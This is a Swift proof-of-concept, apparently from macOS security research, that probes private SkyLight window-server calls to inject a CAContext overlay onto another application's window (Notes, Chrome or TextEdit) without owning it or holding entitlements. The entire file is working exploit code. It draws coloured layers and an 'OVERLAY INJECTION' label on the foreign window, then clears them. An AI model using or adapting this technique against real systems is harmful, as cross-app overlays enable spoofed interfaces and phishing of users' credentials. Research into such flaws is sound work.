/// Probe09 — CAContext overlay rendering injection
///
/// The key finding from Probe08: SLSTransactionSetWindowCreatesOverlayCompositingGroup
/// and SLSTransactionSetWindowOverlayContext are BOTH accepted cross-process without
/// ownership rejection. The commits are accepted.
///
/// CAContext (private QuartzCore class) provides cross-process CA rendering:
///   1. [CAContext localContextWithOptions:nil] creates a local rendering context
///   2. context.contextId gives an integer ID shareable with other processes
///   3. The context's layer tree renders in OUR process
///   4. The rendered content appears wherever the contextId is used (e.g. CALayerHost)
///
/// Hypothesis: SLSTransactionSetWindowOverlayContext accepts the same integer
/// context ID format as CAContext.contextId. If so, we can:
///   1. Create a CAContext in our process
///   2. Set a colored root layer on it
///   3. Pass its contextId to SLSTransactionSetWindowOverlayContext on Chrome's window
///   4. Our colored content appears as overlay on Chrome
///
/// This would be a RENDERING INJECTION breakthrough — we can draw anything on
/// any window without owning it or using any entitlements.
///
/// Also tests SLSCreateLayerContext's returned IDs with CAContext.contextWithId:
/// to see if they refer to the same context table.

import AppKit
import QuartzCore
import SkyLightBridge

let lib = dlopen("/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight", RTLD_LAZY)!
func sym<T>(_ name: String) -> T { unsafeBitCast(dlsym(lib, name)!, to: T.self) }

typealias TxCreateFn = @convention(c) (Int32) -> UnsafeMutableRawPointer?
typealias TxCommitFn = @convention(c) (UnsafeMutableRawPointer, Int32, Int32) -> Int32
let txCreate: TxCreateFn = sym("SLSTransactionCreate")
let txCommit: TxCommitFn = sym("SLSTransactionCommit")

typealias TxOverlayGroupFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Bool) -> Void
let setOverlayGroup: TxOverlayGroupFn = sym("SLSTransactionSetWindowCreatesOverlayCompositingGroup")

typealias TxOverlayCtxFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, UInt32) -> Void
let setOverlayCtx: TxOverlayCtxFn = sym("SLSTransactionSetWindowOverlayContext")

typealias CreateLayerCtxFn = @convention(c) (Int32, UnsafeMutablePointer<Int32>, UnsafeMutablePointer<Int32>) -> Int32
let createLayerCtx: CreateLayerCtxFn = sym("SLSCreateLayerContext")

let ourCID = SLSMainConnectionID()

// ObjC runtime helpers for CAContext (private QuartzCore class)
// Use objc_msgSend via function pointer casts to avoid Swift overload confusion

typealias MsgSend0 = @convention(c) (AnyObject, Selector) -> AnyObject?
typealias MsgSend1 = @convention(c) (AnyObject, Selector, AnyObject?) -> AnyObject?
typealias MsgSend1i32 = @convention(c) (AnyObject, Selector, Int32) -> AnyObject?
typealias MsgSendVoid1 = @convention(c) (AnyObject, Selector, AnyObject?) -> Void

let _msgSend = unsafeBitCast(
    dlsym(dlopen(nil, RTLD_LAZY)!, "objc_msgSend")!, to: MsgSend0.self)

func msgSend0(_ obj: AnyObject, _ selName: String) -> AnyObject? {
    unsafeBitCast(_msgSend, to: MsgSend0.self)(obj, NSSelectorFromString(selName))
}
func msgSend1(_ obj: AnyObject, _ selName: String, _ arg: AnyObject?) -> AnyObject? {
    unsafeBitCast(_msgSend, to: MsgSend1.self)(obj, NSSelectorFromString(selName), arg)
}
func msgSend1i32(_ obj: AnyObject, _ selName: String, _ arg: Int32) -> AnyObject? {
    unsafeBitCast(_msgSend, to: MsgSend1i32.self)(obj, NSSelectorFromString(selName), arg)
}
func msgSendVoid1(_ obj: AnyObject, _ selName: String, _ arg: AnyObject?) {
    unsafeBitCast(_msgSend, to: MsgSendVoid1.self)(obj, NSSelectorFromString(selName), arg)
}

func makeCAContext() -> (context: AnyObject, contextId: UInt32)? {
    guard let contextClass = NSClassFromString("CAContext") else {
        print("  CAContext class not found"); return nil
    }
    guard let ctx = msgSend1(contextClass as AnyObject, "localContextWithOptions:", nil) else {
        print("  localContextWithOptions returned nil"); return nil
    }
    guard let cidVal = ctx.value(forKey: "contextId") as? UInt32 else {
        print("  contextId property not readable"); return nil
    }
    return (ctx, cidVal)
}

func makeCAContextWithCGS(cid: Int32) -> (context: AnyObject, contextId: UInt32)? {
    guard let contextClass = NSClassFromString("CAContext") else { return nil }
    // +[CAContext contextWithCGSConnection:cid options:nil]
    // Two args: (Int32, AnyObject?) — need special msgSend
    typealias CGSCtxFn = @convention(c) (AnyObject, Selector, Int32, AnyObject?) -> AnyObject?
    let sel = NSSelectorFromString("contextWithCGSConnection:options:")
    guard let ctx = unsafeBitCast(_msgSend, to: CGSCtxFn.self)(
        contextClass as AnyObject, sel, cid, nil) else {
        print("  contextWithCGSConnection returned nil"); return nil
    }
    guard let cidVal = ctx.value(forKey: "contextId") as? UInt32 else {
        print("  contextId not readable from CGS context"); return nil
    }
    return (ctx, cidVal)
}

class AppDelegate: NSObject, NSApplicationDelegate {
    var ourWindow: NSWindow!

    func applicationDidFinishLaunching(_ notification: Notification) {
        ourWindow = NSWindow(
            contentRect: NSRect(x: 50, y: 200, width: 400, height: 300),
            styleMask: [.titled, .closable],
            backing: .buffered,
            defer: false)
        ourWindow.title = "Probe09 Overlay Test"
        ourWindow.backgroundColor = .cyan
        ourWindow.makeKeyAndOrderFront(nil)

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { self.runTests() }
    }

    func foreignWID() -> CGWindowID? {
        for bid in ["com.apple.Notes", "com.google.Chrome", "com.apple.TextEdit"] {
            if let app = NSRunningApplication.runningApplications(withBundleIdentifier: bid).first {
                app.activate(options: [])
                Thread.sleep(forTimeInterval: 0.3)
                let wlist = CGWindowListCopyWindowInfo([.optionOnScreenOnly, .excludeDesktopElements], kCGNullWindowID)
                    as? [[CFString: Any]] ?? []
                if let info = wlist.first(where: {
                    ($0[kCGWindowOwnerPID as CFString] as? Int32) == app.processIdentifier &&
                    ($0[kCGWindowLayer as CFString] as? Int32 ?? 99) == 0
                }), let wid = info[kCGWindowNumber as CFString] as? CGWindowID {
                    print("Target: \(app.localizedName ?? bid) WID=\(wid)")
                    return wid
                }
            }
        }
        return nil
    }

    func runTests() {
        guard let teWID = foreignWID() else { print("No target app"); exit(1) }
        let ourWID = windowID(for: ourWindow)
        print("OurCID=\(ourCID)  OurWID=\(ourWID)")
        print("")

        // ── Test 1: CAContext.localContextWithOptions: ─────────────────────────
        print("=== Test 1: CAContext.localContextWithOptions on OWN window ===")
        guard let (localCtx, localCtxId) = makeCAContext() else {
            print("  Failed to create CAContext"); exit(1)
        }
        print("  localContext: contextId=\(localCtxId)  (hex: 0x\(String(localCtxId, radix: 16)))")

        // Create a bright red root layer
        let redLayer = CALayer()
        redLayer.backgroundColor = CGColor(red: 1, green: 0, blue: 0, alpha: 0.8)
        redLayer.frame = CGRect(x: 0, y: 0, width: 400, height: 300)

        // Set the layer on the context
        msgSendVoid1(localCtx, "setLayer:", redLayer)
        print("  Set red layer on localContext")

        // Apply as overlay on OUR OWN window (control)
        if let txn = txCreate(ourCID) {
            setOverlayGroup(txn, ourWID, true)
            setOverlayCtx(txn, ourWID, localCtxId)
            let cs = txCommit(txn, 0, 0)
            print("  setOverlayGroup + setOverlayContext on OWN window: commit=\(cs)")
        }
        Thread.sleep(forTimeInterval: 3.0)
        print("  (was our cyan window covered by red? Did red overlay appear?)")
        // Clean up own window
        if let txn = txCreate(ourCID) {
            setOverlayCtx(txn, ourWID, 0)
            setOverlayGroup(txn, ourWID, false)
            _ = txCommit(txn, 0, 0)
        }
        Thread.sleep(forTimeInterval: 0.5)
        print("")

        // ── Test 2: CAContext overlay on FOREIGN window ────────────────────────
        print("=== Test 2: CAContext overlay on FOREIGN window (opcode 0x6e + 0x6b) ===")
        // Create a new local context for the foreign window test
        guard let (remoteCtx, remoteCtxId) = makeCAContext() else {
            print("  Failed to create second CAContext"); exit(1)
        }
        print("  New CAContext contextId=\(remoteCtxId)")

        // Large bright green layer that would cover the foreign window
        let greenLayer = CALayer()
        greenLayer.backgroundColor = CGColor(red: 0, green: 0.8, blue: 0, alpha: 0.9)
        greenLayer.frame = CGRect(x: 0, y: 0, width: 2000, height: 2000)
        let label = CATextLayer()
        label.string = "OVERLAY INJECTION"
        label.frame = CGRect(x: 50, y: 50, width: 400, height: 50)
        label.fontSize = 30
        label.foregroundColor = CGColor(red: 1, green: 1, blue: 1, alpha: 1)
        greenLayer.addSublayer(label)
        msgSendVoid1(remoteCtx, "setLayer:", greenLayer)
        print("  Set green layer with label on context")

        if let txn = txCreate(ourCID) {
            setOverlayGroup(txn, teWID, true)
            setOverlayCtx(txn, teWID, remoteCtxId)
            let cs = txCommit(txn, 0, 0)
            print("  setOverlayGroup + setOverlayContext on foreign WID=\(teWID): commit=\(cs)")
        }
        Thread.sleep(forTimeInterval: 5.0)
        print("  *** CHECK SCREEN NOW — did green overlay with 'OVERLAY INJECTION' text appear on foreign window? ***")
        Thread.sleep(forTimeInterval: 3.0)

        // Clean up
        if let txn = txCreate(ourCID) {
            setOverlayCtx(txn, teWID, 0)
            setOverlayGroup(txn, teWID, false)
            _ = txCommit(txn, 0, 0)
        }
        print("  Overlay cleared")
        print("")

        // ── Test 3: SLSCreateLayerContext vs CAContext — same table? ───────────
        print("=== Test 3: SLSCreateLayerContext returned ID — can CAContext wrap it? ===")
        var id1: Int32 = 0
        var id2: Int32 = 0
        let slsStatus = createLayerCtx(ourCID, &id1, &id2)
        print("  SLSCreateLayerContext: status=\(slsStatus) id1=\(id1) id2=\(id2)")

        if let contextClass = NSClassFromString("CAContext") {
            // Try with id1
            if let wrappedCtx1 = msgSend1(contextClass as AnyObject, "contextWithId:", NSNumber(value: id1)) {
                let cid = wrappedCtx1.value(forKey: "contextId") as? UInt32 ?? 0
                print("  contextWithId:(\(id1)) → contextId=\(cid)  \(cid > 0 ? "Valid!" : "null or 0")")
            } else {
                print("  contextWithId:(\(id1)) → nil")
            }
            // Try with id2
            if let wrappedCtx2 = msgSend1(contextClass as AnyObject, "contextWithId:", NSNumber(value: id2)) {
                let cid = wrappedCtx2.value(forKey: "contextId") as? UInt32 ?? 0
                print("  contextWithId:(\(id2)) → contextId=\(cid)  \(cid > 0 ? "Valid!" : "null or 0")")
            } else {
                print("  contextWithId:(\(id2)) → nil")
            }
        }
        print("")

        // ── Test 4: CGS-based context ──────────────────────────────────────────
        print("=== Test 4: CAContext.contextWithCGSConnection overlay ===")
        if let (cgsCtx, cgsCtxId) = makeCAContextWithCGS(cid: ourCID) {
            print("  contextWithCGSConnection:(\(ourCID)) contextId=\(cgsCtxId)")
            let blueLayer = CALayer()
            blueLayer.backgroundColor = CGColor(red: 0, green: 0, blue: 1, alpha: 0.7)
            blueLayer.frame = CGRect(x: 0, y: 0, width: 2000, height: 2000)
            msgSendVoid1(cgsCtx, "setLayer:", blueLayer)
            if let txn = txCreate(ourCID) {
                setOverlayGroup(txn, teWID, true)
                setOverlayCtx(txn, teWID, cgsCtxId)
                _ = txCommit(txn, 0, 0)
            }
            Thread.sleep(forTimeInterval: 3.0)
            print("  (watch screen — blue overlay on foreign window?)")
            if let txn = txCreate(ourCID) {
                setOverlayCtx(txn, teWID, 0)
                setOverlayGroup(txn, teWID, false)
                _ = txCommit(txn, 0, 0)
            }
        } else {
            print("  CGS-based context creation failed")
        }
        print("")

        // ── Test 5: SLSCreateLayerContext id2 (small slot) → overlay ─────────
        print("=== Test 5: SLSCreateLayerContext id2 (slot index) as overlay context ===")
        var slsId1b: Int32 = 0
        var slsId2b: Int32 = 0
        let slsStatus2 = createLayerCtx(ourCID, &slsId1b, &slsId2b)
        print("  SLSCreateLayerContext: status=\(slsStatus2) id1=\(slsId1b) id2=\(slsId2b)")
        // Try id2 (small slot index — possibly the actual CA context slot)
        if let txn = txCreate(ourCID) {
            setOverlayGroup(txn, teWID, true)
            setOverlayCtx(txn, teWID, UInt32(bitPattern: slsId2b))
            let cs = txCommit(txn, 0, 0)
            print("  setOverlay with id2=\(slsId2b): commit=\(cs)")
        }
        Thread.sleep(forTimeInterval: 4.0)
        print("  (watch screen — any overlay using id2?)")
        // Also try id2 on OWN window to see if it does anything
        if let txn = txCreate(ourCID) {
            setOverlayGroup(txn, ourWID, true)
            setOverlayCtx(txn, ourWID, UInt32(bitPattern: slsId2b))
            _ = txCommit(txn, 0, 0)
        }
        Thread.sleep(forTimeInterval: 2.0)
        print("  (was our cyan probe window covered by anything?)")
        if let txn = txCreate(ourCID) {
            setOverlayCtx(txn, teWID, 0)
            setOverlayGroup(txn, teWID, false)
            setOverlayCtx(txn, ourWID, 0)
            setOverlayGroup(txn, ourWID, false)
            _ = txCommit(txn, 0, 0)
        }
        print("")

        print("=== Summary ===")
        print("If ANY overlay appeared visually on the foreign window, rendering injection is CONFIRMED.")
        print("This would be: draw anything on any app's window, without ownership or entitlements.")
        exit(0)
    }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
let delegate = AppDelegate()
app.delegate = delegate
app.run()
